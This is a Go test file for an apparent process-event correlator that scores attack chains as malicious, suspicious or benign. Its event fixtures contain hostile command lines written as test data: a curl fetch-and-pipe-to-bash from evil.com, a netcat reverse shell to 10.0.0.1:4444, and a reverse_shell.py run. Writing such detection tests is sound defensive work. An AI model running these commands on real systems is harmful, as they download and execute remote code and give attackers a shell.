package main

import (
	"sync"
	"testing"
	"time"
)

func TestCorrelatorAddAndEvaluate(t *testing.T) {
	c := NewCorrelator(30*time.Second, 100)
	now := time.Now()

	c.Add(Event{
		ProcessGUID: "host-1000-001",
		EventType:   EventTypeExecve,
		ImagePath:   "/usr/bin/curl",
		CommandLine: "curl http://evil.com/payload",
		ProcessID:   1000,
		HostName:    "test",
		Timestamp:   now,
	})

	c.Add(Event{
		ProcessGUID: "host-1000-001",
		EventType:   EventTypeOpen,
		FilePath:    "/tmp/payload.sh",
		FileFlags:   "O_WRONLY|O_CREAT",
		ProcessID:   1000,
		HostName:    "test",
		Timestamp:   now.Add(100 * time.Millisecond),
	})

	c.Add(Event{
		ProcessGUID: "host-1000-001",
		EventType:   EventTypeExecve,
		ImagePath:   "/bin/bash",
		CommandLine: "/bin/bash /tmp/payload.sh",
		ProcessID:   1000,
		HostName:    "test",
		Timestamp:   now.Add(200 * time.Millisecond),
	})

	chain := c.Evaluate("host-1000-001")
	if chain == nil {
		t.Fatal("expected correlation chain to be detected")
	}
	if chain.Score < 0.6 {
		t.Errorf("Score = %.2f, want >= 0.6", chain.Score)
	}
	if len(chain.Evidence) == 0 {
		t.Error("expected evidence in chain")
	}
	if len(chain.Actions) == 0 {
		t.Error("expected actions in chain")
	}
}

func TestCorrelatorExecThenC2(t *testing.T) {
	c := NewCorrelator(30*time.Second, 100)
	now := time.Now()

	c.Add(Event{
		ProcessGUID: "host-2000-001",
		EventType:   EventTypeExecve,
		ImagePath:   "/usr/bin/python3",
		CommandLine: "python3 reverse_shell.py",
		ProcessID:   2000,
		HostName:    "test",
		Timestamp:   now,
	})

	c.Add(Event{
		ProcessGUID: "host-2000-001",
		EventType:   EventTypeConnect,
		RemoteAddr:  "10.0.0.1",
		RemotePort:  4444,
		ProcessID:   2000,
		HostName:    "test",
		Timestamp:   now.Add(100 * time.Millisecond),
	})

	chain := c.Evaluate("host-2000-001")
	if chain == nil {
		t.Fatal("expected exec_then_c2 chain")
	}
	if chain.Score < 0.7 {
		t.Errorf("Score = %.2f, want >= 0.7", chain.Score)
	}
}

func TestCorrelatorPivotChain(t *testing.T) {
	c := NewCorrelator(30*time.Second, 100)
	now := time.Now()

	guid := "host-3000-001"
	c.Add(Event{
		ProcessGUID: guid,
		EventType:   EventTypeExecve,
		ImagePath:   "/usr/bin/nc",
		CommandLine: "nc -l 8080",
		ProcessID:   3000,
		HostName:    "test",
		Timestamp:   now,
	})

	c.Add(Event{
		ProcessGUID: guid,
		EventType:   EventTypeConnect,
		RemoteAddr:  "10.0.0.1",
		RemotePort:  8080,
		ProcessID:   3000,
		HostName:    "test",
		Timestamp:   now.Add(100 * time.Millisecond),
	})

	c.Add(Event{
		ProcessGUID: guid,
		EventType:   EventTypeConnect,
		RemoteAddr:  "10.0.0.2",
		RemotePort:  9090,
		ProcessID:   3000,
		HostName:    "test",
		Timestamp:   now.Add(200 * time.Millisecond),
	})

	chain := c.Evaluate(guid)
	if chain == nil {
		t.Fatal("expected pivot chain")
	}
	if chain.Score < 0.85 {
		t.Errorf("Score = %.2f, want >= 0.85", chain.Score)
	}
}

func TestCorrelatorRapidSpawn(t *testing.T) {
	c := NewCorrelator(30*time.Second, 100)
	now := time.Now()

	guid := "host-4000-001"
	for i := 0; i < 6; i++ {
		c.Add(Event{
			ProcessGUID: guid,
			EventType:   EventTypeExecve,
			ImagePath:   "/bin/sh",
			CommandLine: "sh -c 'echo test'",
			ProcessID:   4000,
			HostName:    "test",
			Timestamp:   now.Add(time.Duration(i) * 10 * time.Millisecond),
		})
	}

	chain := c.Evaluate(guid)
	if chain == nil {
		t.Fatal("expected rapid spawn chain")
	}
	if chain.Score < 0.6 {
		t.Errorf("Score = %.2f, want >= 0.6", chain.Score)
	}
}

func TestCorrelatorNoMatch(t *testing.T) {
	c := NewCorrelator(30*time.Second, 100)
	now := time.Now()

	c.Add(Event{
		ProcessGUID: "host-5000-001",
		EventType:   EventTypeExecve,
		ImagePath:   "/bin/ls",
		CommandLine: "ls -la",
		ProcessID:   5000,
		HostName:    "test",
		Timestamp:   now,
	})

	chain := c.Evaluate("host-5000-001")
	if chain != nil {
		t.Errorf("expected nil chain for benign events, got score=%.2f", chain.Score)
	}
}

func TestCorrelatorSingleEventNoMatch(t *testing.T) {
	c := NewCorrelator(30*time.Second, 100)

	c.Add(Event{
		ProcessGUID: "host-6000-001",
		EventType:   EventTypeConnect,
		RemoteAddr:  "10.0.0.1",
		RemotePort:  4444,
		ProcessID:   6000,
		HostName:    "test",
		Timestamp:   time.Now(),
	})

	chain := c.Evaluate("host-6000-001")
	if chain != nil {
		t.Errorf("expected nil for single event, got score=%.2f", chain.Score)
	}
}

func TestCorrelatorTimeWindowPruning(t *testing.T) {
	c := NewCorrelator(1*time.Millisecond, 100)
	now := time.Now()

	c.Add(Event{
		ProcessGUID: "host-7000-001",
		EventType:   EventTypeExecve,
		ImagePath:   "/usr/bin/nc",
		CommandLine: "nc -e /bin/sh 10.0.0.1 4444",
		ProcessID:   7000,
		HostName:    "test",
		Timestamp:   now,
	})

	c.Add(Event{
		ProcessGUID: "host-7000-001",
		EventType:   EventTypeConnect,
		RemoteAddr:  "10.0.0.1",
		RemotePort:  4444,
		ProcessID:   7000,
		HostName:    "test",
		Timestamp:   now,
	})

	time.Sleep(5 * time.Millisecond)

	chain := c.Evaluate("host-7000-001")
	if chain != nil {
		t.Errorf("expected nil chain after window expires, got score=%.2f", chain.Score)
	}
}

func TestCorrelatorPrune(t *testing.T) {
	c := NewCorrelator(1*time.Millisecond, 100)

	for i := 0; i < 5; i++ {
		c.Add(Event{
			ProcessGUID: "host-" + string(rune('A'+i)) + "-001",
			EventType:   EventTypeExecve,
			ProcessID:   uint32(i),
			HostName:    "test",
			Timestamp:   time.Now(),
		})
	}

	if c.Size() != 5 {
		t.Errorf("Size = %d, want 5 before prune", c.Size())
	}

	time.Sleep(5 * time.Millisecond)
	c.Prune()

	if c.Size() != 0 {
		t.Errorf("Size = %d, want 0 after prune", c.Size())
	}
}

func TestCorrelatorEvaluateAll(t *testing.T) {
	c := NewCorrelator(30*time.Second, 100)
	now := time.Now()

	c.Add(Event{
		ProcessGUID: "host-a-001",
		EventType:   EventTypeExecve,
		ImagePath:   "/bin/ls",
		CommandLine: "ls -la",
		ProcessID:   100,
		HostName:    "test",
		Timestamp:   now,
	})

	c.Add(Event{
		ProcessGUID: "host-b-001",
		EventType:   EventTypeExecve,
		ImagePath:   "/usr/bin/curl",
		CommandLine: "curl http://evil.com/x | bash",
		ProcessID:   200,
		HostName:    "test",
		Timestamp:   now,
	})
	c.Add(Event{
		ProcessGUID: "host-b-001",
		EventType:   EventTypeConnect,
		RemoteAddr:  "10.0.0.1",
		RemotePort:  4444,
		ProcessID:   200,
		HostName:    "test",
		Timestamp:   now.Add(100 * time.Millisecond),
	})

	chains := c.EvaluateAll()
	if len(chains) != 1 {
		t.Errorf("expected 1 chain, got %d", len(chains))
	}
}

func TestCorrelatorConcurrentAccess(t *testing.T) {
	c := NewCorrelator(30*time.Second, 1000)

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			guid := "host-" + string(rune('A'+id%26)) + "-001"
			c.Add(Event{
				ProcessGUID: guid,
				EventType:   EventTypeExecve,
				ProcessID:   uint32(id),
				HostName:    "test",
				Timestamp:   time.Now(),
			})
			c.Evaluate(guid)
		}(i)
	}
	wg.Wait()

	if c.Size() == 0 {
		t.Error("expected entries after concurrent access")
	}
}

func TestScoreToVerdict(t *testing.T) {
	tests := []struct {
		score float64
		want  string
	}{
		{0.9, "malicious"},
		{0.8, "malicious"},
		{0.7, "suspicious"},
		{0.6, "suspicious"},
		{0.5, "benign"},
		{0.0, "benign"},
	}

	for _, tt := range tests {
		if got := scoreToVerdict(tt.score); got != tt.want {
			t.Errorf("scoreToVerdict(%.1f) = %q, want %q", tt.score, got, tt.want)
		}
	}
}

func TestCorrelatorEmptyGUID(t *testing.T) {
	c := NewCorrelator(30*time.Second, 100)

	c.Add(Event{
		ProcessGUID: "",
		EventType:   EventTypeExecve,
		ProcessID:   100,
		HostName:    "test",
		Timestamp:   time.Now(),
	})

	chain := c.Evaluate("")
	if chain != nil {
		t.Error("expected nil chain for empty GUID")
	}
}
